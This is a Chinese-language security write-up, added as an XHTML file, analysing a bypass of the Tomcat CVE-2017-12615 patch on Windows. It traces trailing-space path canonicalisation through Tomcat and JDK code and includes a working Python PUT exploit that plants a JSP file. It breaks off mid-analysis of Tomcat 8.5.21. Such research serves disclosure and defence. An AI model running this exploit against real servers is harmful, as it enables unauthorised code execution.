@@ -1,0 +1,228 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>Tomcat CVE-2017-12615 的另外一个 Bypass</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>Tomcat CVE-2017-12615 的另外一个 Bypass</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&amp;mid=2651371036&amp;idx=2&amp;sn=74815cd2366d0c5e1fb82aea962d6a39&amp;chksm=8d39c794ba4e4e82726e5519151f245645476ea20c624760bbffdc632b5518fe7692b580b769&amp;scene=126&amp;sessionid=1681376289#rd">http://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&amp;mid=2651371036&amp;idx=2&amp;sn=74815cd2366d0c5e1fb82aea962d6a39&amp;chksm=8d39c794ba4e4e82726e5519151f245645476ea20c624760bbffdc632b5518fe7692b580b769&amp;scene=126&amp;sessionid=1681376289#rd</a></blockquote><section style="font-size:16px;" label="Powered by 135editor.com" data-role="outer"><section class="_135editor" style="border-width: 0px;border-style: none;border-color: initial;box-sizing: border-box;" data-role="paragraph"><section class="_135editor" style="border-width: 0px;border-style: none;border-color: initial;box-sizing: border-box;" data-id="85508" data-tools="135编辑器"><section class="layout" style="border-width: 0px;border-style: initial;border-color: initial;margin: 2px auto;box-sizing: border-box;"><section style="height: 6px;box-sizing: border-box;color: inherit;"><section style="height: 100%;width: 6px;float: right;border-top-width: 2px;border-top-style: solid;border-color: rgb(117, 117, 118);border-right-width: 2px;border-right-style: solid;box-sizing: border-box;color: inherit;"><br/></section><section style="display: inline-block;color: rgb(117, 117, 118);clear: both;box-sizing: border-box;border-color: rgb(117, 117, 118);"/></section><section style="margin: -1px 4px;padding: 0.8em;border-width: 1px;border-style: solid;border-color: rgb(117, 117, 118);box-sizing: border-box;box-shadow: rgb(117, 117, 117) 0px 0px 4px;color: inherit;"><p style="color: rgb(51, 51, 51);font-size: 1em;line-height: 1.4;word-break: break-all;word-wrap: break-word;text-indent: 2em;text-align: justify;"><span style="font-size: 15px;">Tomcat CVE-2017-12615补丁发布后，很快就有人发现直接 "PUT /shell.jsp%20" 会失败，但是可以通过 PUT /shell.jsp/ 绕过。此外，我还发现了另外一种绕过思路，与各位分享一下。</span></p></section><section style="height: 6px;box-sizing: border-box;color: inherit;"><section style="height: 100%;width: 6px;float: left;border-bottom-width: 2px;border-bottom-style: solid;border-color: rgb(117, 117, 118);border-left-width: 2px;border-left-style: solid;box-sizing: border-box;color: inherit;"/></section></section></section><section class="_135editor" style="border-width: 0px;border-style: none;border-color: initial;box-sizing: border-box;" data-role="paragraph"><p><br/></p></section><h2 style="margin-top: 20px;margin-bottom: 20px;box-sizing: inherit;font-weight: bold;font-size: 24px;white-space: normal;font-variant-numeric: inherit;font-stretch: inherit;line-height: inherit;color: rgb(51, 51, 51);"><span style="box-sizing: inherit;"/></h2><section class="_135editor" style="border-width: 0px;border-style: none;border-color: initial;box-sizing: border-box;" data-id="85699" data-tools="135编辑器"><section class="layout" style="margin-right: auto;margin-left: auto;"><section style="border-left: 6px solid rgb(33, 33, 34);border-right-width: 0px;border-right-color: rgb(33, 33, 34);display: inline-block;float: left;color: inherit;margin-top: 8px;border-bottom: 6px solid transparent !important;border-top: 6px solid transparent !important;box-sizing: border-box;"/><section style="border-left: 6px solid rgb(33, 33, 34);border-right-width: 0px;border-right-color: rgb(33, 33, 34);display: inline-block;float: left;color: inherit;margin-top: 8px;border-bottom: 6px solid transparent !important;border-top: 6px solid transparent !important;box-sizing: border-box;"/><section style="border-left: 20px solid rgb(33, 33, 34);border-right-width: 0px;border-right-color: rgb(33, 33, 34);display: inline-block;float: left;color: inherit;border-bottom: 15px solid transparent !important;border-top: 15px solid transparent !important;box-sizing: border-box;"/><section><section style="display: inline-block;margin-left: 10px;color: inherit;line-height: 2.3em;"><strong><span class="135brush" style="color:inherit;font-size:18px;" data-brushtype="text">0x01 CVE-2017-12615 补丁分析</span></strong></section></section></section></section><h2 style="margin-top: 20px;margin-bottom: 20px;box-sizing: inherit;font-weight: bold;font-size: 24px;white-space: normal;font-variant-numeric: inherit;font-stretch: inherit;line-height: inherit;color: rgb(51, 51, 51);"><span style="box-sizing: inherit;"/></h2><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;text-indent: 2em;text-align: justify;"><span style="caret-color: red;font-size: 15px;">CVE-2017-12615 是 Tomcat 在设置了 readonly 为 false 状态下，可以通过 PUT 创建一个“.jsp ”的文件。由于后缀名非 .jsp 和 .jspx ，所以 Tomcat 在处理的时候经由 DefaultServlet 处理而不是 JspServlet ，又由于 Windows 不允许文件名为空格结尾，所以可以成功创建一个 JSP 文件，以达到 RCE 的结果。<br/></span></p><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;text-indent: 2em;text-align: justify;"><span style="caret-color: red;font-size: 15px;">龙哥在周五敲我说，在高并发的情况下，还是可以成功写入一个 JSP 文件；同时微博上的一个小伙伴也告诉我，在一定的条件下还是可以成功创建文件。<br/></span></p><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;text-indent: 2em;text-align: justify;"><span style="font-size: 15px;"><span style="caret-color: red;box-sizing: inherit;font-weight: 700;">测试发现，对于 7.0.81 可以成功复现，但是对于 8.5.21 失败。如下代码分析是基于 Apache Tomcat 7.0.81 的。</span><span style="caret-color: red;">经过分析，我发现这两种情况其实本质是相同的。不过在此之前，首先看一下 Tomcat 对于 CVE-2017-12615 的补丁好了。</span><br/></span></p><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;text-indent: 2em;text-align: justify;"><span style="caret-color: red;font-size: 15px;">同样的，进入 DefaultServlet 的 doPut 方法，再调用到 FileDirContext 的 bind 方法，接着调用 file 方法：</span><br/></p><pre style="box-sizing: inherit;margin-top: 1em;margin-bottom: 1em;padding: 10px;overflow: auto;font-size: 14px;word-wrap: normal;background-color: rgb(235, 238, 245);border-radius: 4px;"><code class="language-text" style="box-sizing: inherit;">   protected File file(String name, boolean mustExist) {
+        File file = new File(base, name);
+        return validate(file, mustExist, absoluteBase);
+    }</code></pre><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;text-indent: 2em;text-align: justify;"><span style="caret-color: red;font-size: 15px;">注意到 mustExist 为 false ：</span><br/></p><pre style="box-sizing: inherit;margin-top: 1em;margin-bottom: 1em;padding: 10px;overflow: auto;font-size: 14px;word-wrap: normal;background-color: rgb(235, 238, 245);border-radius: 4px;"><code class="language-text" style="box-sizing: inherit;">   protected File validate(File file, boolean mustExist, String absoluteBase) {
+    
+        if (!mustExist || file.exists() &amp;&amp; file.canRead()) { // !mustExist = true，进入 if
+            ...
+            try {
+                canPath = file.getCanonicalPath(); 
+                // 此处，对路径进行规范化，调用的是 java.io.File 内的方法
+                // 之前的 Payload 中结尾为空格，那么这个方法就会去掉空格
+            } catch (IOException e) {
+    
+            }
+            ...
+            if ((absoluteBase.length() &lt; absPath.length())
+                &amp;&amp; (absoluteBase.length() &lt; canPath.length())) {
+                ...
+                // 判断规范化的路径以及传入的路径是否相等，由于 canPath 没有空格，return null
+                if (!canPath.equals(absPath))
+                    return null;
+            }
+        } else {
+            return null;
+        }</code></pre><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;text-indent: 2em;text-align: justify;"><span style="caret-color: red;font-size: 15px;">经过上述的判断，导致我们无法通过空格来创建 JSP 文件。<br/></span></p><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;text-indent: 2em;text-align: justify;"><span style="caret-color: red;font-size: 15px;">但是之前提到，在高并发或者另外一种情况下，却又能创建 JSP 文件，也就是说 canPath.equals(absPath) 为 true 。通过深入分析，找出了其原因。</span><br/></p><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;text-indent: 2em;"><br/></p><section class="_135editor" style="border-width: 0px;border-style: none;border-color: initial;box-sizing: border-box;" data-id="85699" data-tools="135编辑器"><section class="layout" style="margin-right: auto;margin-left: auto;"><section style="border-left: 6px solid rgb(33, 33, 34);border-right-width: 0px;border-right-color: rgb(33, 33, 34);display: inline-block;float: left;color: inherit;margin-top: 8px;border-bottom: 6px solid transparent !important;border-top: 6px solid transparent !important;box-sizing: border-box;"/><section style="border-left: 6px solid rgb(33, 33, 34);border-right-width: 0px;border-right-color: rgb(33, 33, 34);display: inline-block;float: left;color: inherit;margin-top: 8px;border-bottom: 6px solid transparent !important;border-top: 6px solid transparent !important;box-sizing: border-box;"/><section style="border-left: 20px solid rgb(33, 33, 34);border-right-width: 0px;border-right-color: rgb(33, 33, 34);display: inline-block;float: left;color: inherit;border-bottom: 15px solid transparent !important;border-top: 15px solid transparent !important;box-sizing: border-box;"/><section><section style="display: inline-block;margin-left: 10px;color: inherit;line-height: 2.3em;"><strong><span class="135brush" style="color:inherit;font-size:18px;" data-brushtype="text">0x02 WinNTFileSystem.canonicalize</span></strong></section></section></section></section><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;text-indent: 2em;text-align: justify;"><span style="caret-color: red;font-size: 15px;">上述代码中，对于路径的规范化是调用的 file.getCanonicalPath() ：</span><br/></p><pre style="box-sizing: inherit;margin-top: 1em;margin-bottom: 1em;padding: 10px;overflow: auto;font-size: 14px;word-wrap: normal;background-color: rgb(235, 238, 245);border-radius: 4px;"><code class="language-text" style="box-sizing: inherit;">   public String getCanonicalPath() throws IOException {
+        if (isInvalid()) {
+            throw new IOException("Invalid file path");
+        }
+        return fs.canonicalize(fs.resolve(this));
+    }</code></pre><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;text-indent: 2em;text-align: justify;"><span style="caret-color: red;font-size: 15px;">也就是调用 FS 的 canonicalize 方法，对于 Windows，调用的是 WinNTFileSystem.canonicalize 。这个 Bypass 的锅也就出在 WinNTFileSystem.canonicalize 里，下面为其代码，我已去处掉了无关代码可以更清晰的了解原因。</span><br/></p><pre style="box-sizing: inherit;margin-top: 1em;margin-bottom: 1em;padding: 10px;overflow: auto;font-size: 14px;word-wrap: normal;background-color: rgb(235, 238, 245);border-radius: 4px;"><code class="language-text" style="box-sizing: inherit;">   @Override
+    public String canonicalize(String path) throws IOException {
+        ...
+        if (!useCanonCaches) { // !useCanonCaches = false
+            return canonicalize0(path);
+        } else {
+            // 进入此处分支
+            String res = cache.get(path);
+            if (res == null) {
+                String dir = null;
+                String resDir = null;
+                if (useCanonPrefixCache) {
+                    dir = parentOrNull(path);
+                    if (dir != null) {
+                        resDir = prefixCache.get(dir);
+                        if (resDir != null) {
+                            String filename = path.substring(1 + dir.length());
+                            // 此处 canonicalizeWithPrefix 不会去掉尾部空格
+                            res = canonicalizeWithPrefix(resDir, filename);
+                            cache.put(dir + File.separatorChar + filename, res);
+                        }
+                    }
+                }
+                if (res == null) {
+                    // 此处的 canonicalize0 会将尾部空格去掉
+                    res = canonicalize0(path);
+                    cache.put(path, res);
+                    if (useCanonPrefixCache &amp;&amp; dir != null) {
+                        resDir = parentOrNull(res);
+                        if (resDir != null) {
+                            File f = new File(res);
+                            if (f.exists() &amp;&amp; !f.isDirectory()) {
+                                prefixCache.put(dir, resDir);
+                            }
+                        }
+                    }
+                }
+            }
+            // 返回路径
+            return res;
+        }
+    }</code></pre><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;text-indent: 2em;text-align: justify;"><span style="caret-color: red;font-size: 15px;">上述代码有一个非常非常神奇的地方：<br/></span></p><ul class=" list-paddingleft-2" style=""><li><p style="text-align: justify;"><span style="font-size: 15px;">canonicalizeWithPrefix(resDir, filename) 不会去掉路径尾部空格</span></p></li><li><p style="text-align: justify;"><span style="font-size: 15px;">canonicalize0(path) 会去掉路径尾部空格</span></p></li></ul><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;text-indent: 2em;text-align: justify;"><span style="font-size: 15px;">为了满足进入存在 canonicalizeWithPrefix 的分支，需要通过两个判断：</span></p><ul class=" list-paddingleft-2" style=""><li><p style="text-align: justify;"><span style="font-size: 15px;">String res = cache.get(path); 应为 null ，此处 PUT 一个从未 PUT 过的文件名即可</span></p></li><li><p style="text-align: justify;"><span style="font-size: 15px;">resDir = prefixCache.get(dir); 应不为 null</span></p></li></ul><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;text-indent: 2em;text-align: justify;"><span style="caret-color: red;font-size: 15px;">可以发现，对于 prefixCache 进行添加元素的操作在下方存在 canonicalize0 的 if 分支：</span><br/></p><pre style="box-sizing: inherit;margin-top: 1em;margin-bottom: 1em;padding: 10px;overflow: auto;font-size: 14px;word-wrap: normal;background-color: rgb(235, 238, 245);border-radius: 4px;"><code class="language-text" style="box-sizing: inherit;">           if (res == null) {
+                res = canonicalize0(path);
+                cache.put(path, res);
+                if (useCanonPrefixCache &amp;&amp; dir != null) {
+                    resDir = parentOrNull(res);
+                    if (resDir != null) {
+                        File f = new File(res);
+                        if (f.exists() &amp;&amp; !f.isDirectory()) { // 需要满足条件
+                            prefixCache.put(dir, resDir); // 进行 put 操作</code></pre><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;text-indent: 2em;text-align: justify;"><span style="font-size: 15px;"><span style="caret-color: red;">通过代码可知，如果想在 prefixCache 存入数据，需要满足</span><span style="caret-color: red;box-sizing: inherit;font-weight: 700;">文件存在</span><span style="caret-color: red;">且</span><span style="caret-color: red;box-sizing: inherit;font-weight: 700;">文件不是目录</span><span style="caret-color: red;">的条件。</span><br/></span></p><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;text-indent: 2em;text-align: justify;"><span style="caret-color: red;font-size: 15px;">prefixCache 存放的是什么数据呢？通过单步调试可以发现：</span><br/></p><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;"><img width="657" class="origin_image zh-lightbox-thumb lazy" style="caret-color: red;box-sizing: inherit;overflow: hidden;display: block;margin: 0.72em auto;cursor: -webkit-zoom-in;" data-src="http://mmbiz.qpic.cn/mmbiz_jpg/FOh11C4BDicSkiaHurweibpmicU8hGjh1TIPC5Zte6UCxibJ1EyumEY2PmyJb7bicpatP4ibWF0obHibaFWqKOeeMVfolQ/0?wx_fmt=jpeg" data-ratio="0.38" data-type="jpeg" data-w="600" src="../Images/e36e73a28fcfb485db61f8e12c9e03d3.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_jpg/FOh11C4BDicSkiaHurweibpmicU8hGjh1TIPC5Zte6UCxibJ1EyumEY2PmyJb7bicpatP4ibWF0obHibaFWqKOeeMVfolQ/0?wx_fmt=jpeg"/></p><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;text-indent: 2em;text-align: justify;"><span style="caret-color: red;font-size: 15px;">resDir 为文件所在的绝对路径。<br/></span></p><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;text-indent: 2em;text-align: justify;"><span style="caret-color: red;font-size: 15px;">那么如果想进入 canonicalizeWithPrefix 的分支，需要满足的两个条件已经理清楚了。从 prefixCache.put 开始，触发漏洞需要的流程如下。</span><br/></p><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;text-indent: 2em;"><br/></p><section class="_135editor" style="border-width: 0px;border-style: none;border-color: initial;box-sizing: border-box;" data-id="85699" data-tools="135编辑器"><section class="layout" style="margin-right: auto;margin-left: auto;"><section style="border-left: 6px solid rgb(33, 33, 34);border-right-width: 0px;border-right-color: rgb(33, 33, 34);display: inline-block;float: left;color: inherit;margin-top: 8px;border-bottom: 6px solid transparent !important;border-top: 6px solid transparent !important;box-sizing: border-box;"/><section style="border-left: 6px solid rgb(33, 33, 34);border-right-width: 0px;border-right-color: rgb(33, 33, 34);display: inline-block;float: left;color: inherit;margin-top: 8px;border-bottom: 6px solid transparent !important;border-top: 6px solid transparent !important;box-sizing: border-box;"/><section style="border-left: 20px solid rgb(33, 33, 34);border-right-width: 0px;border-right-color: rgb(33, 33, 34);display: inline-block;float: left;color: inherit;border-bottom: 15px solid transparent !important;border-top: 15px solid transparent !important;box-sizing: border-box;"/><section><section style="display: inline-block;margin-left: 10px;color: inherit;line-height: 2.3em;"><strong><span class="135brush" style="color:inherit;font-size:18px;" data-brushtype="text">0x03 The Exploit</span></strong></section></section></section></section><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;text-indent: 2em;text-align: justify;"><span style="caret-color: red;font-size: 15px;">首先，要向 prefixCache 中添加内容，那么需要满足 f.exists() &amp;&amp; !f.isDirectory() 这个条件。仍然还是空格的锅：</span><br/></p><pre style="box-sizing: inherit;margin-top: 1em;margin-bottom: 1em;padding: 10px;overflow: auto;font-size: 14px;word-wrap: normal;background-color: rgb(235, 238, 245);border-radius: 4px;"><code class="language-text" style="box-sizing: inherit;">   &gt;&gt;&gt; os.path.exists("C:/Windows/System32/cmd.exe")
+   True
+   &gt;&gt;&gt; os.path.exists("C:/Windows/System32/cmd.exe ")
+   True</code></pre><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;text-indent: 2em;text-align: justify;"><span style="caret-color: red;font-size: 15px;">那么，在无已知文件的情况下，我们只需要先 PUT 创建一个 test.txt ，在 PUT 一个 test.txt%20 ，即可向 prefixCache 添加数据了。</span><br/></p><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;"><img width="850" class="origin_image zh-lightbox-thumb lazy" style="caret-color: red;box-sizing: inherit;overflow: hidden;display: block;margin: 0.72em auto;cursor: -webkit-zoom-in;" data-src="http://mmbiz.qpic.cn/mmbiz_jpg/FOh11C4BDicSkiaHurweibpmicU8hGjh1TIPaD9Sl7wxB5jAyMibuiapiagGbGILfwH9lvCibxqudgSe5jibzDoXZTM4exg/0?wx_fmt=jpeg" data-ratio="0.17" data-type="jpeg" data-w="600" src="../Images/98451b73829255b79d0cdef2fe6d70c1.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_jpg/FOh11C4BDicSkiaHurweibpmicU8hGjh1TIPaD9Sl7wxB5jAyMibuiapiagGbGILfwH9lvCibxqudgSe5jibzDoXZTM4exg/0?wx_fmt=jpeg"/></p><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;"><br/></p><img width="949" class="origin_image zh-lightbox-thumb lazy" style="box-sizing: inherit;overflow: hidden;display: block;margin: 0.72em auto;cursor: -webkit-zoom-in;color: rgb(51, 51, 51);font-size: medium;white-space: normal;" data-src="http://mmbiz.qpic.cn/mmbiz_jpg/FOh11C4BDicSkiaHurweibpmicU8hGjh1TIP5cBNFfaDUSSZbiaML9gOtNiaaYX1MSXic8PWeIe4MLZ8sElX9bmzGpyjQ/0?wx_fmt=jpeg" data-ratio="0.18166666666666667" data-type="jpeg" data-w="600" src="../Images/dc3bf94a134c2dc8cba1b5dffd1d9917.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_jpg/FOh11C4BDicSkiaHurweibpmicU8hGjh1TIP5cBNFfaDUSSZbiaML9gOtNiaaYX1MSXic8PWeIe4MLZ8sElX9bmzGpyjQ/0?wx_fmt=jpeg"/><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;text-indent: 2em;text-align: justify;"><span style="caret-color: red;font-size: 15px;">单步查看，发现已经通过分支，并且向 prefixCache 添加数据：</span><br/></p><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;"><img width="992" class="origin_image zh-lightbox-thumb lazy" style="caret-color: red;box-sizing: inherit;overflow: hidden;display: block;margin: 0.72em auto;cursor: -webkit-zoom-in;" data-src="http://mmbiz.qpic.cn/mmbiz_jpg/FOh11C4BDicSkiaHurweibpmicU8hGjh1TIPB0t1rJGJq8zxZyW6e2h31aHsyMmIMdy2eLscA1kRTYMeylWyyTlx1Q/0?wx_fmt=jpeg" data-ratio="0.47" data-type="jpeg" data-w="600" src="../Images/0d01c6aa08190dccc2d15617019d4f0e.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_jpg/FOh11C4BDicSkiaHurweibpmicU8hGjh1TIPB0t1rJGJq8zxZyW6e2h31aHsyMmIMdy2eLscA1kRTYMeylWyyTlx1Q/0?wx_fmt=jpeg"/></p><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;text-indent: 2em;text-align: justify;"><span style="caret-color: red;font-size: 15px;">接着，创建一个 JSP 文件 “test.jsp%20” ，单步查看：</span><br/></p><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;"><img width="884" class="origin_image zh-lightbox-thumb lazy" style="caret-color: red;box-sizing: inherit;overflow: hidden;display: block;margin: 0.72em auto;cursor: -webkit-zoom-in;" data-src="http://mmbiz.qpic.cn/mmbiz_jpg/FOh11C4BDicSkiaHurweibpmicU8hGjh1TIP3VicaHPm4yArLXV0pGlibBWMPKeDgeThHeh6WcqicxPQqgg3vtkJ8oPYg/0?wx_fmt=jpeg" data-ratio="0.7066666666666667" data-type="jpeg" data-w="600" src="../Images/487749b75ab5e6e52c5ba287db93c011.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_jpg/FOh11C4BDicSkiaHurweibpmicU8hGjh1TIP3VicaHPm4yArLXV0pGlibBWMPKeDgeThHeh6WcqicxPQqgg3vtkJ8oPYg/0?wx_fmt=jpeg"/></p><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;text-indent: 2em;text-align: justify;"><span style="caret-color: red;font-size: 15px;">可以发现，resDir 不为 null ，且 res 结尾带着空格。于是可以通过最开始的 canPath.equals(absPath) 的检查。查看 BurpSuite 中的返回：</span><br/></p><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;"><img width="953" class="origin_image zh-lightbox-thumb lazy" style="caret-color: red;box-sizing: inherit;overflow: hidden;display: block;margin: 0.72em auto;cursor: -webkit-zoom-in;" data-src="http://mmbiz.qpic.cn/mmbiz_jpg/FOh11C4BDicSkiaHurweibpmicU8hGjh1TIPgHx0nNP8qzBB4s8HFwsibXvnSfQhVwicV6EGf23e9uGRyOIdicYHQnEvw/0?wx_fmt=jpeg" data-ratio="0.19" data-type="jpeg" data-w="600" src="../Images/c1cdf47c34279bd122e45235ffa038fa.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_jpg/FOh11C4BDicSkiaHurweibpmicU8hGjh1TIPgHx0nNP8qzBB4s8HFwsibXvnSfQhVwicV6EGf23e9uGRyOIdicYHQnEvw/0?wx_fmt=jpeg"/></p><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;text-indent: 2em;text-align: justify;"><span style="caret-color: red;font-size: 15px;">发现已经创建成功了。<br/></span></p><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;text-indent: 2em;text-align: justify;"><span style="font-size: 15px;">Exploit:</span></p><pre style="box-sizing: inherit;margin-top: 1em;margin-bottom: 1em;padding: 10px;overflow: auto;font-size: 14px;word-wrap: normal;background-color: rgb(235, 238, 245);border-radius: 4px;"><code class="language-text" style="box-sizing: inherit;">   import sys
+   import requests
+   import random
+   import hashlib
+   shell_content = '''
+   RR is handsome!
+   '''
+   if len(sys.argv) &lt;= 1:
+       print('Usage: python tomcat.py [url]')
+       exit(1)
+   def main():
+       filename = hashlib.md5(str(random.random())).hexdigest()[:6]
+       put_url = '{}/{}.txt'.format(sys.argv[1], filename)
+       shell_url = '{}/{}.jsp'.format(sys.argv[1], filename)
+       requests.put(put_url, data='1')
+       requests.put(put_url + '%20', data='1')
+       requests.put(shell_url + '%20', data=shell_content)
+       requests.delete(put_url)
+       print('Shell URL: {}'.format(shell_url))
+   if __name__ == '__main__':
+       main()</code></pre><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;"><img width="813" class="origin_image zh-lightbox-thumb lazy" style="caret-color: red;box-sizing: inherit;overflow: hidden;display: block;margin: 0.72em auto;cursor: -webkit-zoom-in;" data-src="http://mmbiz.qpic.cn/mmbiz_jpg/FOh11C4BDicSkiaHurweibpmicU8hGjh1TIPmicibx2j8CA1YXicS3GzwpaIUjibPibW6yD3rHdgIWd7bcYSgnwg9P8LmOw/0?wx_fmt=jpeg" data-ratio="0.25666666666666665" data-type="jpeg" data-w="600" src="../Images/d61bf6eadbb0b44f0c91a65893075714.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_jpg/FOh11C4BDicSkiaHurweibpmicU8hGjh1TIPmicibx2j8CA1YXicS3GzwpaIUjibPibW6yD3rHdgIWd7bcYSgnwg9P8LmOw/0?wx_fmt=jpeg"/></p><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;"><br/></p><section class="_135editor" style="border-width: 0px;border-style: none;border-color: initial;box-sizing: border-box;" data-id="85699" data-tools="135编辑器"><section class="layout" style="margin-right: auto;margin-left: auto;"><section style="border-left: 6px solid rgb(33, 33, 34);border-right-width: 0px;border-right-color: rgb(33, 33, 34);display: inline-block;float: left;color: inherit;margin-top: 8px;border-bottom: 6px solid transparent !important;border-top: 6px solid transparent !important;box-sizing: border-box;"/><section style="border-left: 6px solid rgb(33, 33, 34);border-right-width: 0px;border-right-color: rgb(33, 33, 34);display: inline-block;float: left;color: inherit;margin-top: 8px;border-bottom: 6px solid transparent !important;border-top: 6px solid transparent !important;box-sizing: border-box;"/><section style="border-left: 20px solid rgb(33, 33, 34);border-right-width: 0px;border-right-color: rgb(33, 33, 34);display: inline-block;float: left;color: inherit;border-bottom: 15px solid transparent !important;border-top: 15px solid transparent !important;box-sizing: border-box;"/><section><section style="display: inline-block;margin-left: 10px;color: inherit;line-height: 2.3em;"><strong><span class="135brush" style="color:inherit;font-size:18px;" data-brushtype="text">0x04 Tomcat 8.5.21!?</span></strong></section></section></section></section><h2 style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;font-variant-numeric: inherit;font-weight: bold;font-stretch: inherit;font-size: 24px;line-height: inherit;color: rgb(51, 51, 51);white-space: normal;text-indent: 2em;text-align: justify;"><span style="font-size: 15px;">Tomcat 8.5.21 通过 WebResourceRoot 来处理资源文件：</span><br/></h2><pre style="box-sizing: inherit;margin-top: 1em;margin-bottom: 1em;padding: 10px;overflow: auto;font-size: 14px;word-wrap: normal;background-color: rgb(235, 238, 245);border-radius: 4px;"><code class="language-text" style="box-sizing: inherit;">   protected transient WebResourceRoot resources = null;
+   ...
+
+   @Override
+   protected void doPut(HttpServletRequest req, HttpServletResponse resp)
+       throws ServletException, IOException {
+       ...
+       try {
+           if (range != null) {
+               File contentFile = executePartialPut(req, range, path);
+               resourceInputStream = new FileInputStream(contentFile);
+           } else {
+               resourceInputStream = req.getInputStream();
+           }
+
+           if (resources.write(path, resourceInputStream, true)) { // 进入 write
+               if (resource.exists()) {
+                   resp.setStatus(HttpServletResponse.SC_NO_CONTENT);
+               } else {
+                   resp.setStatus(HttpServletResponse.SC_CREATED);
+               }
+           } else {</code></pre><p style="box-sizing: inherit;margin-top: 20px;margin-bottom: 20px;color: rgb(51, 51, 51);font-size: medium;white-space: normal;text-indent: 2em;text-align: justify;"><span style="caret-color: red;font-size: 15px;">接着调用 DirResourceSet.write ：</span><br/></p><pre style="box-sizing: inherit;margin-top: 1em;margin-bottom: 1em;padding: 10px;overflow: auto;font-size: 14px;word-wrap: normal;background-color: rgb(235, 238, 245);border-radius: 4px;"><code class="language-text" style="box-sizing: inherit;">   @Override
+   public boolean write(String path, InputStream is, boolean overwrite) {
+       path = validate(path);
+       if (!overwrite &amp;&amp; preResourceExists(path)) {
+           return false;
+       }
+       // main 为 DirResourceSet 的 instance
+       boolean writeResult = main.write(path, is, overwrite);
+       ...
